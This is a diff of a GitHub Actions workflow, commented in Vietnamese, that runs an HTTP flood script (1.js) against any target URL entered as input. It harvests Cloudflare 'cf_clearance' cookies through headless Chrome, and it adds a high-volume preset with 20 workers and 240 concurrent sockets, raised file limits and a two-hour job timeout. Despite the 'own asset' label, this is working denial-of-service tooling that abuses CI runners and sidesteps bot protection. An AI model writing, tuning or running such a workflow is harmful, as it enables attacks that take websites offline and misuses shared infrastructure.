@@ -7,33 +7,39 @@ on:
         description: 'Target URL (website của bạn)'
         required: true
         type: string
-      time:
-        description: 'Thời gian chạy (giây)'
+      preset:
+        description: 'Preset chạy'
         required: true
-        default: '30'
+        default: 'full20'
+        type: choice
+        options: [full20, custom]
+      time:
+        description: 'Thời gian (giây) — bỏ qua nếu preset=full20'
+        required: false
+        default: '60'
         type: string
       rate:
-        description: 'Requests/giây/thread'
-        required: true
-        default: '5'
+        description: 'Req/s/thread — bỏ qua nếu preset=full20'
+        required: false
+        default: '10'
         type: string
       threads:
-        description: 'Số worker thread'
-        required: true
-        default: '2'
+        description: 'Số worker — bỏ qua nếu preset=full20'
+        required: false
+        default: '20'
         type: string
       cookie_count:
-        description: 'Số phiên browser để lấy cf_clearance'
-        required: true
-        default: '1'
+        description: 'Số phiên browser — bỏ qua nếu preset=full20'
+        required: false
+        default: '2'
         type: string
 
 jobs:
   flood:
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 120              # đủ cho time lên tới ~120 phút
     env:
-      NODE_OPTIONS: '--max-old-space-size=4096'
+      NODE_OPTIONS: '--max-old-space-size=2048'
 
     steps:
       - name: Checkout
@@ -44,12 +50,38 @@ jobs:
         with:
           node-version: '20'
 
-      - name: Install system deps (Chrome + Xvfb)
+      - name: Verify Node.js and Script Syntax
+        run: |
+          echo "Node version: $(node -v)"
+          node --check 1.js || { echo "Syntax error in 1.js"; exit 1; }
+
+      - name: Resolve parameters
+        id: p
+        run: |
+          if [ "${{ inputs.preset }}" = "full20" ]; then
+            # Preset "full 20": 20 worker, 12 flooder/worker (240 socket) để không OOM
+            echo "TIME=120"    >> $GITHUB_OUTPUT
+            echo "RATE=10"     >> $GITHUB_OUTPUT
+            echo "THREADS=20"  >> $GITHUB_OUTPUT
+            echo "COOKIES=2"   >> $GITHUB_OUTPUT
+            echo "STREAMS=12"  >> $GITHUB_OUTPUT
+          else
+            echo "TIME=${{ inputs.time }}"            >> $GITHUB_OUTPUT
+            echo "RATE=${{ inputs.rate }}"            >> $GITHUB_OUTPUT
+            echo "THREADS=${{ inputs.threads }}"      >> $GITHUB_OUTPUT
+            echo "COOKIES=${{ inputs.cookie_count }}" >> $GITHUB_OUTPUT
+            echo "STREAMS=150"                         >> $GITHUB_OUTPUT
+          fi
+          echo "---- Resolved ----"
+          cat $GITHUB_OUTPUT
+
+      - name: Install system deps (Chrome + Xvfb + Fonts)
         run: |
           sudo apt-get update
           sudo apt-get install -y --no-install-recommends \
             xvfb libnss3 libatk-bridge2.0-0 libgtk-3-0 \
-            libgbm1 libasound2t64 fonts-liberation ca-certificates
+            libgbm1 libasound2t64 libxss1 libxtst6 libx11-xcb1 \
+            libxcb-dri3-0 libdrm2 fonts-liberation ca-certificates
           npx puppeteer browsers install chrome --install-deps
 
       - name: Install npm deps
@@ -67,18 +99,32 @@ jobs:
           echo "ulimit -n 65536" >> $GITHUB_ENV
           ulimit -n
 
+      - name: Tune flooder count per worker
+        run: |
+          # Giảm MAX_CONCURRENT_STREAMS_PER_WORKER theo preset để tránh OOM
+          sed -i "s/const MAX_CONCURRENT_STREAMS_PER_WORKER = [0-9]*;/const MAX_CONCURRENT_STREAMS_PER_WORKER = ${{ steps.p.outputs.STREAMS }};/" 1.js
+          grep "MAX_CONCURRENT_STREAMS_PER_WORKER =" 1.js
+
+      - name: System sanity (mem/cpu/limits)
+        run: |
+          echo "nproc: $(nproc)"
+          free -h
+          ulimit -n
+
       - name: Run flood (own asset)
         env:
-          TARGET: ${{ inputs.target }}
-          TIME: ${{ inputs.time }}
-          RATE: ${{ inputs.rate }}
-          THREADS: ${{ inputs.threads }}
-          COOKIES: ${{ inputs.cookie_count }}
+          TARGET:  ${{ inputs.target }}
+          TIME:    ${{ steps.p.outputs.TIME }}
+          RATE:    ${{ steps.p.outputs.RATE }}
+          THREADS: ${{ steps.p.outputs.THREADS }}
+          COOKIES: ${{ steps.p.outputs.COOKIES }}
         run: |
           ulimit -n 65536
-          # 1.js nằm ở root repo; nếu khác đường dẫn, sửa lại
+          echo "Running: target=$TARGET time=$TIME rate=$RATE threads=$THREADS cookies=$COOKIES"
           xvfb-run -a --server-args="-screen 0 1920x1080x24" \
-            node 1.js "$TARGET" "$TIME" "$RATE" "$THREADS" "$COOKIES" 2>&1 | tee run.log
+            node --max-old-space-size=2048 1.js \
+              "$TARGET" "$TIME" "$RATE" "$THREADS" "$COOKIES" \
+              2>&1 | tee run.log
 
       - name: Upload log
         if: always()
